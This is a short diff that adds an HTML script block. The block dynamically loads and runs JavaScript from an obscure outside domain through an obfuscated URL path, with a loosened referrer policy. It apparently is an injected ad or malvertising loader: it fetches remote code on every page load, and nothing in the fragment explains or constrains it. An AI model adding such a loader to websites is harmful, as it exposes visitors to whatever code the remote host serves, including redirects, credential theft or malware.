@@ -1,0 +1,12 @@
+<script>
+(function(uxcjl){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = uxcjl || {};
+s.src = "\/\/spitefuldecision.com\/b\/XGV.sUdGGPlO0_Y\/Wbcc\/oefmL9\/u\/ZXU\/lXkQPwTYYZ2\/MwjLEoxRMTD\/IKtdNijTYGydMCT\/EBwDMYwR";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
